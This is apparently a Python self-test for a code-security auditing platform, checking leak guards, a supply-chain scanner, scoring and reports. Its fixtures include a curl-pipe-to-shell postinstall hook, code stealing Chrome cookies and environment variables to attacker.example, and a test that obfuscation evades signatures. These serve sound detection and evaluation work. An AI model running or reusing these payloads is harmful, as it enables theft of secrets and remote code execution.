"""Integrity self-test for the auditing platform.

    python selftest.py

Two of these checks exist specifically to stop data leakage returning silently:
calibration must draw from the validation split, and the evaluation-scope
novelty index must never contain a test-split CVE. Both were real defects, and a
passing test is the only thing that keeps them fixed.

The supply-chain check is the precision guard: it asserts not only that a real
attack is caught, but that ordinary code raises no alarm at all. A scanner that
cries wolf on legitimate repositories is worse than no scanner.
"""
import json
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT / "src"))

ok = []


def check(name, fn):
    try:
        fn()
        ok.append((name, True, ""))
    except Exception as e:
        ok.append((name, False, f"{type(e).__name__}: {e}"))


# 1. every module imports
def t_imports():
    import importlib
    for m in ("models", "prompts", "evaluate", "deps_evaluate", "secrets_evaluate",
              "malware_evaluate", "strategy_select", "static_tools", "repo_analyze",
              "compare_analysis", "manifest_parse", "vuln_intel", "supply_chain",
              "pdf_report", "report_html", "cwe_catalog"):
        importlib.import_module(m)


check("all modules import", t_imports)


# 2. calibration draws from val, never test
def t_leak():
    import strategy_select as SS
    assert SS.CALIB_SPLIT == "val", "calibration must use val"
    s, _, _ = SS.load_sample(8)
    test_ids = {json.loads(l)["sample_id"]
                for l in (ROOT / "data/processed/test.jsonl").open(encoding="utf-8")}
    assert not [r for r in s if r["sample_id"] in test_ids], "test leaked into calibration"


check("no test-split leak in calibration", t_leak)


# 3. eval-scope novelty index excludes test CVEs
def t_scope():
    import vuln_intel as V
    rec = None
    for l in (ROOT / "data/processed/test.jsonl").open(encoding="utf-8"):
        r = json.loads(l)
        if r["label"] == 1 and r.get("cve_id"):
            rec = r
            break
    a = V.classify_novelty(rec["code"], rec["repo"], rec["func_name"], scope="audit")
    e = V.classify_novelty(rec["code"], rec["repo"], rec["func_name"], scope="eval")
    assert a["novelty"] == "known", "audit index should recognise it"
    assert e["novelty"] != "known", "eval index leaked a test CVE"


check("eval index holds out test CVEs", t_scope)


# 4. supply chain: catches attack, silent on benign
def t_supply():
    import supply_chain as SC
    mal = Path(tempfile.mkdtemp())
    (mal / "package.json").write_text(
        '{"scripts":{"postinstall":"curl http://1.2.3.4/x|sh"}}', encoding="utf-8")
    assert SC.analyse(mal)["findings"], "missed an install hook"
    assert not SC.analyse(mal)["clone_safe"]
    ben = Path(tempfile.mkdtemp())
    (ben / "package.json").write_text(
        '{"scripts":{"build":"webpack","test":"jest"},"dependencies":{"react":"18.2.0"}}',
        encoding="utf-8")
    (ben / "a.py").write_text(
        "import os, requests\nU=os.environ.get('API')\nrequests.get(U)\n", encoding="utf-8")
    r = SC.analyse(ben)
    assert not r["findings"], f"false positive on benign: {r['findings']}"
    assert r["clone_safe"]


check("supply chain: detects attack, silent on benign", t_supply)


# 4b. real cookie-stealer caught, HTTP cookie jar not (the socket.io false positive)
def t_cookie_theft():
    import supply_chain as SC
    steal = ("import requests\n"
             "p = open('C:/Users/x/AppData/Local/Google/Chrome/User Data/Default/Cookies','rb').read()\n"
             "requests.post('http://attacker.example', data=p)\n")
    assert SC.check_network(steal, "s.py"), "missed a real cookie-store theft"
    legit = ("const h = new Headers();\n"
             "this._cookieJar.appendCookies(h);\n"
             "return fetch(this.uri(), {headers: h});\n")
    assert not SC.check_network(legit, "polling.ts"), \
        "false positive on an HTTP client's own cookie jar"


check("cookie theft caught, HTTP cookie jar not", t_cookie_theft)


# 4c. interpretability rubric separates a grounded explanation from a fluent lie
def t_interpretability():
    import interpretability as I
    code = "int copy(char *d, const char *s){char buf[16]; strcpy(buf, s); return 0;}"
    good = I.score_explanation(
        "The `strcpy` into the 16-byte `buf` has no bound on `s`, a buffer overflow "
        "that writes out of bounds.", code, "CWE-787")
    bad = I.score_explanation(
        "The `validateInput` routine fails to sanitize the SQL query.", code, "CWE-787")
    assert good["composite"] >= 0.8, f"grounded explanation under-scored: {good}"
    assert bad["composite"] <= 0.2, f"hallucinated explanation over-scored: {bad}"
    assert bad["hallucinated_refs"] >= 1, "did not flag the invented identifier"


check("interpretability: grounded vs hallucinated", t_interpretability)


# 4d. obfuscation is deterministic, changes the surface, and actually evades a signature
def t_obfuscate():
    import obfuscate as OB
    import malware_evaluate as MAL
    src = ('import os, requests\n'
           'requests.post("http://attacker.example/x", json=os.environ)\n'
           'os.system("id")\n')
    a = OB.obfuscate(src, level=3, seed=7)
    b = OB.obfuscate(src, level=3, seed=7)
    assert a == b, "obfuscation must be deterministic for a fixed seed"
    assert a != src, "obfuscation did not change the surface"
    assert "attacker.example" not in a, "payload URL should be encoded away"
    # the whole point: the surface strings a signature keys on are gone
    assert "os.system" not in a and "requests.post" not in a


check("obfuscation: deterministic, hides surface tokens", t_obfuscate)


# 4e. the objective names OpenAI, Google and Meta - all three must be representable
def t_vendor_coverage():
    import models as M
    vendors = {p.vendor for p in M.REGISTRY.values() if p.vendor}
    for required in ("OpenAI", "Google", "Meta"):
        assert required in vendors, f"objective-named vendor '{required}' not in registry"
    meta = [n for n, p in M.REGISTRY.items() if p.vendor == "Meta"]
    assert meta, "no Meta (Llama) model available"


check("model vendors cover OpenAI/Google/Meta", t_vendor_coverage)


# 4f. statistics: CIs bracket the point estimate; McNemar detects a real gap and ignores noise
def t_stats():
    import stats as ST
    import random
    rng = random.Random(1)
    trues = [rng.randint(0, 1) for _ in range(200)]
    strong = [t for t in trues]                       # perfect
    weak = [t if rng.random() < 0.55 else 1 - t for t in trues]
    ci = ST.bootstrap_ci(strong, trues, "f1", n_boot=300)
    assert ci["ci_low"] <= ci["point"] <= ci["ci_high"], "CI must bracket the point"
    mc = ST.mcnemar(strong, weak, trues)
    assert mc["better"] == "A" and mc["significant_at_05"], "should detect the real gap"
    # identical predictions => no significant difference
    same = ST.mcnemar(weak, weak, trues)
    assert not same["significant_at_05"], "identical predictors must not test significant"


check("statistics: bootstrap CI + McNemar", t_stats)


# 4g. deps parser salvages a truncated chain-of-thought reply (the gemini-cot bug)
def t_deps_salvage():
    import deps_evaluate as DEP
    truncated = ('reasoning...\n{"vulnerable_dependencies": [{"package": "flask", '
                 '"version": "0.12", "reason": "CVE-2018')          # cut off, no closing
    names, ok = DEP.parse_reply(truncated)
    assert ok and "flask" in names, f"failed to salvage truncated reply: {(names, ok)}"
    # a genuinely empty answer is still a clean parse, not a failure
    _, ok_empty = DEP.parse_reply('{"vulnerable_dependencies": []}')
    assert ok_empty, "empty list must parse as a valid answer"
    # real garbage stays a failure (no invented packages)
    names_g, ok_g = DEP.parse_reply("I am not sure about this manifest.")
    assert not ok_g and not names_g, "garbage must not be salvaged into a package"


check("deps parser salvages truncated cot reply", t_deps_salvage)


# 5. full pipeline + both verdicts + PDF
def t_pipeline():
    import config as C
    import models as M
    import repo_analyze as RA
    import pdf_report as PDF
    ls = json.loads((C.PROCESSED / "label_space.json").read_text(encoding="utf-8"))
    d = Path(tempfile.mkdtemp())
    (d / "requirements.txt").write_text("Flask==0.12\n", encoding="utf-8")
    (d / "a.py").write_text("def f(x):\n    return eval(x)\n", encoding="utf-8")
    rep = RA.analyse_repo(d, M.get("stub"), ls, "zero_shot", max_files=10, verbose=False)
    assert rep.clone_safety in ("safe", "caution", "dangerous")
    assert rep.risk_level in ("clean", "low", "medium", "high", "critical")
    assert isinstance(rep.by_tier, dict)
    out = Path(tempfile.mkdtemp()) / "r.pdf"
    PDF.build_ai_report(out, "test/repo", rep.__dict__, None, "stub", "zero_shot")
    assert out.stat().st_size > 3000, "PDF too small"


check("full pipeline + two verdicts + PDF", t_pipeline)


# 6. AI-vs-static comparison still works
def t_compare():
    import compare_analysis as CA
    ai = {"findings": [{"pillar": "vulnerability", "file": "a.py", "line": 2,
                        "severity": "MEDIUM", "detail": "x", "category": "CWE-95",
                        "tier": "C"}]}
    st = {"findings": [{"file": "a.py", "line": 2, "tool": "semgrep", "rule": "r",
                        "cwe": "CWE-95", "severity": "HIGH", "message": "m"}],
          "languages": {"python": 1}, "tools_used": ["semgrep"], "n_findings": 1}
    c = CA.compare(ai, st)
    assert c["agreed_items"], "comparison lost its agreement bucket"


check("AI vs static comparison", t_compare)

print("=" * 66)
for name, passed, err in ok:
    print(f"  {'PASS' if passed else 'FAIL'}  {name}")
    if err:
        print(f"        {err}")
print("=" * 66)
print(f"{sum(1 for _, p, _ in ok if p)}/{len(ok)} checks passed")
sys.exit(0 if all(p for _, p, _ in ok) else 1)
